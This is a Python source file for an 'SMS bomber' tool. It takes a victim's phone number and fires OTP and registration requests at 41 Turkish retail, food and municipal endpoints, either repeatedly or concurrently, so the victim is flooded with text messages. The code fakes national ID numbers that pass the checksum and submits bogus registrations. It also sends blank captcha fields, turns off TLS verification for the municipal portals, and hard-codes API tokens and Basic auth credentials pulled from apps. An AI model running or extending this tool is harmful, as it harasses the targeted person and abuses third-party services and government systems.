# smsapi.py — ZENIX SMS Bomber Servisleri (41 Adet)
import requests
from random import choice, randint
from string import ascii_lowercase


class SmsBomber:
    def __init__(self, phone: str, mail: str = ""):
        self.phone = str(phone).lstrip("0")
        if self.phone.startswith("+90"): self.phone = self.phone[3:]
        if self.phone.startswith("90") and len(self.phone) == 12: self.phone = self.phone[2:]
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
        self.tc = self._gen_tc()
        self.results = []

    def _gen_tc(self):
        r = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
        r.append(((sum(r[0:9:2]) * 7) - sum(r[1:8:2])) % 10)
        r.append(sum(r[:10]) % 10)
        return "".join(str(x) for x in r)

    def _add(self, name, ok): self.results.append((name, ok))

    def kahvedunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                headers={"Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/", "User-Agent": "Mozilla/5.0"},
                json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
            self._add("kahvedunyasi.com", r.json().get("processStatus") == "Success")
        except: self._add("kahvedunyasi.com", False)

    def wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            self._add("wmf.com.tr", r.status_code == 202)
        except: self._add("wmf.com.tr", False)

    def bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            self._add("bim.veesk.net", r.status_code == 200)
        except: self._add("bim.veesk.net", False)

    def englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com/api/member/sendOtp",
                headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Referer": "https://www.englishhome.com/", "User-Agent": "Mozilla/5.0"},
                json={"Phone": self.phone, "XID": ""}, timeout=6)
            self._add("englishhome.com", r.json().get("isError") == False)
        except: self._add("englishhome.com", False)

    def suiste(self):
        try:
            r = requests.post("https://suiste.com/api/auth/code",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "User-Agent": "suiste/1.7.11"},
                data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}, timeout=6)
            self._add("suiste.com", r.json().get("code") == "common.success")
        except: self._add("suiste.com", False)

    def kimgb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            self._add("kimgb", r.status_code == 200)
        except: self._add("kimgb", False)

    def evidea(self):
        try:
            r = requests.post("https://www.evidea.com/users/register/",
                headers={"Content-Type": "multipart/form-data; boundary=xx", "X-App-Device": "ios", "User-Agent": "Evidea/1"},
                data=f"--xx\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--xx--\r\n", timeout=6)
            self._add("evidea.com", r.status_code == 202)
        except: self._add("evidea.com", False)

    def ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com/api/users/register",
                headers={"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21"},
                json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=6)
            self._add("345dijital.com", r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!")
        except: self._add("345dijital.com", False)

    def tiklagelsin(self):
        try:
            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql",
                headers={"Content-Type": "application/json", "X-No-Auth": "true", "Appversion": "2.4.1"},
                json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}, timeout=6)
            self._add("tiklagelsin.com", r.json().get("data", {}).get("generateOtp") == True)
        except: self._add("tiklagelsin.com", False)

    def naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                headers={"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030", "Locale": "en-TR", "Content-Type": "application/json"},
                json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
            self._add("naosstars.com", r.status_code == 200)
        except: self._add("naosstars.com", False)

    def koton(self):
        try:
            r = requests.post("https://www.koton.com/users/register/",
                headers={"Content-Type": "multipart/form-data; boundary=yy", "X-App-Type": "akinon-mobile", "User-Agent": "Koton/1"},
                data=f"--yy\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--yy--\r\n", timeout=6)
            self._add("koton.com", r.status_code == 202)
        except: self._add("koton.com", False)

    def hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.hayatsu.com.tr", "User-Agent": "Mozilla/5.0"},
                data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            self._add("hayatsu.com.tr", r.json().get("is_success") == True)
        except: self._add("hayatsu.com.tr", False)

    def hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP",
                headers={"Content-Type": "application/json", "User-Agent": "hizliecza/31"},
                json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
            self._add("hizliecza.net", r.status_code == 200)
        except: self._add("hizliecza.net", False)

    def metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1"},
                json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            self._add("metro-tr.com", r.json().get("status") == "success")
        except: self._add("metro-tr.com", False)

    def filemarket(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
                headers={"Content-Type": "application/json", "X-Os": "IOS", "X-Version": "1.7"},
                json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            self._add("filemarket.com.tr", r.json().get("responseType") == "SUCCESS")
        except: self._add("filemarket.com.tr", False)

    def akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms",
                headers={"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"},
                json={"phone": self.phone}, timeout=6)
            self._add("akasya.com.tr", r.json().get("result") == "SMS sended succesfully!")
        except: self._add("akasya.com.tr", False)

    def akbati(self):
        try:
            r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms",
                headers={"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"},
                json={"phone": self.phone}, timeout=6)
            self._add("akbati.com", r.json().get("result") == "SMS sended succesfully!")
        except: self._add("akbati.com", False)

    def komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
                headers={"Content-Type": "application/json", "Firmaid": "32", "Referer": "https://www.komagene.com.tr/"},
                json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            self._add("komagene.com.tr", r.json().get("Success") == True)
        except: self._add("komagene.com.tr", False)

    def porty(self):
        try:
            r = requests.post("https://panel.porty.tech/api.php?",
                headers={"Content-Type": "application/json", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"},
                json={"job": "start_login", "phone": self.phone}, timeout=6)
            self._add("porty.tech", r.json().get("status") == "success")
        except: self._add("porty.tech", False)

    def tasdelen(self):
        try:
            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
                headers={"Content-Type": "application/json"},
                json={"phone": self.phone}, timeout=6)
            self._add("tasdelen", r.json().get("result") == True)
        except: self._add("tasdelen", False)

    def uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
                headers={"Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr"},
                json={"phone_number": self.phone}, timeout=6)
            self._add("uysalmarket.com.tr", r.status_code == 200)
        except: self._add("uysalmarket.com.tr", False)

    def yapp(self):
        try:
            r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
                headers={"Content-Type": "application/json"},
                json={"phone_number": self.phone, "email": self.mail, "firstname": "M", "lastname": "B", "app_version": "1.1.5", "device_type": "I", "sms_code": ""}, timeout=6)
            self._add("yapp.com.tr", r.status_code == 200)
        except: self._add("yapp.com.tr", False)

    def beefull(self):
        try:
            requests.post("https://app.beefull.io/api/inavitas-access-management/signup",
                json={"email": self.mail, "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail, "firstName": "M", "lastName": "B", "language": "tr", "password": "123456"}, timeout=4)
            r = requests.post("https://app.beefull.io/api/inavitas-access-management/sms-login",
                json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
            self._add("beefull.io", r.status_code == 200)
        except: self._add("beefull.io", False)

    def dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0"},
                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
            self._add("dominos.com.tr", r.json().get("isSuccess") == True)
        except: self._add("dominos.com.tr", False)

    def frink(self):
        try:
            r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP",
                headers={"Content-Type": "application/json"},
                json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone}, timeout=6)
            self._add("frink.com.tr", r.json().get("processStatus") == "SUCCESS")
        except: self._add("frink.com.tr", False)

    def bodrum(self):
        try:
            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
                headers={"Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost"},
                json={"gsm": "+90" + self.phone, "source": "orwi"}, timeout=6)
            self._add("bodrum.bel.tr", r.status_code == 200)
        except: self._add("bodrum.bel.tr", False)

    def kofteciyusuf(self):
        try:
            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
                headers={"Content-Type": "application/json; charset=utf-8", "Firmaid": "82", "Ostype": "iOS"},
                json={"FirmaId": 82, "Telefon": self.phone, "FireBaseCihazKey": None, "GuvenlikKodu": None}, timeout=6)
            self._add("kofteciyusuf.com", r.json().get("Success") == True)
        except: self._add("kofteciyusuf.com", False)

    def orwi(self):
        try:
            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
                headers={"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost"},
                json={"gsm": f"+90{self.phone}", "source": "orwi"}, timeout=6)
            self._add("orwi.app", r.status_code == 200)
        except: self._add("orwi.app", False)

    def coffy(self):
        try:
            r = requests.post("https://user-api-gw.coffy.com.tr/user/signup",
                headers={"Content-Type": "application/json", "Language": "tr"},
                json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}, timeout=6)
            self._add("coffy.com.tr", r.status_code == 200)
        except: self._add("coffy.com.tr", False)

    def hamidiye(self):
        try:
            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
                headers={"Content-Type": "application/json", "Origin": "com.hamidiyeapp"},
                json={"isGuest": False, "phone": self.phone}, timeout=6)
            self._add("hamidiye.istanbul", r.json().get("result") == True)
        except: self._add("hamidiye.istanbul", False)

    def money(self):
        try:
            r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP",
                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.money.com.tr", "Referer": "https://www.money.com.tr/"},
                data={"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}, timeout=6)
            self._add("money.com.tr", r.json().get("resultType") == 0)
        except: self._add("money.com.tr", False)

    def alixavien(self):
        try:
            r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp",
                headers={"Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr"},
                json={"Phone": self.phone, "XID": ""}, timeout=6)
            self._add("alixavien.com.tr", r.json().get("isError") == False)
        except: self._add("alixavien.com.tr", False)

    def jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            self._add("jimmykey.com", r.json().get("Sonuc") == True)
        except: self._add("jimmykey.com", False)

    def ido(self):
        try:
            r = requests.post("https://api.ido.com.tr/idows/v2/register",
                headers={"Content-Type": "application/json", "Origin": "https://www.ido.com.tr"},
                json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}, timeout=6)
            self._add("ido.com.tr", r.status_code == 200)
        except: self._add("ido.com.tr", False)

    def littlecaesars(self):
        try:
            r = requests.post("https://api.littlecaesars.com.tr/api/web/Member/Register",
                headers={"Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "X-Platform": "ios", "X-Version": "1.0.0", "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
                json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}, timeout=6)
            self._add("littlecaesars.com.tr", r.status_code == 200 and r.json().get("status") == True)
        except: self._add("littlecaesars.com.tr", False)

    def baydoner(self):
        try:
            r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
                headers={"Content-Type": "application/json", "Xsid": "2HB7FQ6G42QL", "Merchantid": "5701", "Platform": "1", "Appv": "1.6.0"},
                json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Culture": "tr-TR", "Email": self.mail, "Gender": "Kad1n", "GenderId": 2, "merchantID": 5701, "Name": "Memati", "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone, "Platform": 1, "Surname": "Bas"}, timeout=6)
            self._add("baydoner.com", r.json().get("Control") == 1)
        except: self._add("baydoner.com", False)

    def pidem(self):
        try:
            r = requests.post("https://restashop.azurewebsites.net/graphql/",
                headers={"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Referer": "https://pidem.azurewebsites.net/", "User-Agent": "Mozilla/5.0"},
                json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}, timeout=6)
            self._add("pidem.com.tr", r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS")
        except: self._add("pidem.com.tr", False)

    def yilmazticaret(self):
        try:
            r = requests.post("https://app.buyursungelsin.com/api/customer/form/checkx",
                headers={"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0"},
                data=f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n", timeout=6)
            self._add("yilmazticaret.net", r.status_code == 200)
        except: self._add("yilmazticaret.net", False)

    def fatih(self):
        try:
            r = requests.post("https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet",
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be"},
                data=f"------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n", timeout=6, verify=False)
            self._add("fatih.bel.tr", r.status_code == 200)
        except: self._add("fatih.bel.tr", False)

    def sancaktepe(self):
        try:
            r = requests.post("https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet",
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112"},
                data=f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMATI\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n", timeout=6, verify=False)
            self._add("sancaktepe.bel.tr", r.status_code == 200)
        except: self._add("sancaktepe.bel.tr", False)

    def bayrampasa(self):
        try:
            r = requests.post("https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet",
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b"},
                data=f"------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMATI\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n", timeout=6, verify=False)
            self._add("bayrampasa.bel.tr", r.status_code == 200)
        except: self._add("bayrampasa.bel.tr", False)

    def get_services(self):
        return [
            self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
            self.kimgb, self.evidea, self.ucdortbes, self.tiklagelsin, self.naosstars,
            self.koton, self.hayatsu, self.hizliecza, self.metro, self.filemarket,
            self.akasya, self.akbati, self.komagene, self.porty, self.tasdelen,
            self.uysal, self.yapp, self.beefull, self.dominos, self.frink,
            self.bodrum, self.kofteciyusuf, self.orwi, self.coffy, self.hamidiye,
            self.money, self.alixavien, self.jimmykey, self.ido,
            self.littlecaesars, self.baydoner, self.pidem, self.yilmazticaret,
            self.fatih, self.sancaktepe, self.bayrampasa,
        ]

    def run_normal(self, adet=1):
        services = self.get_services()
        for _ in range(adet):
            for svc in services:
                try: svc()
                except: pass

    async def run_normal_async(self, adet=1):
        import asyncio
        await asyncio.to_thread(self.run_normal, adet)

    async def run_turbo(self, adet=1):
        import asyncio
        services = self.get_services()
        for _ in range(adet):
            tasks = [asyncio.to_thread(svc) for svc in services]
            await asyncio.gather(*tasks)


SERVICE_NAMES = [
    "kahvedunyasi.com", "wmf.com.tr", "bim.veesk.net", "englishhome.com",
    "suiste.com", "kimgb", "evidea.com", "345dijital.com", "tiklagelsin.com",
    "naosstars.com", "koton.com", "hayatsu.com.tr", "hizliecza.net",
    "metro-tr.com", "filemarket.com.tr", "akasya.com.tr", "akbati.com",
    "komagene.com.tr", "porty.tech", "tasdelen", "uysalmarket.com.tr",
    "yapp.com.tr", "beefull.io", "dominos.com.tr", "frink.com.tr",
    "bodrum.bel.tr", "kofteciyusuf.com", "orwi.app", "coffy.com.tr",
    "hamidiye.istanbul", "money.com.tr", "alixavien.com.tr",
    "jimmykey.com", "ido.com.tr", "littlecaesars.com.tr",
    "baydoner.com", "pidem.com.tr", "yilmazticaret.net",
    "fatih.bel.tr", "sancaktepe.bel.tr", "bayrampasa.bel.tr"
]
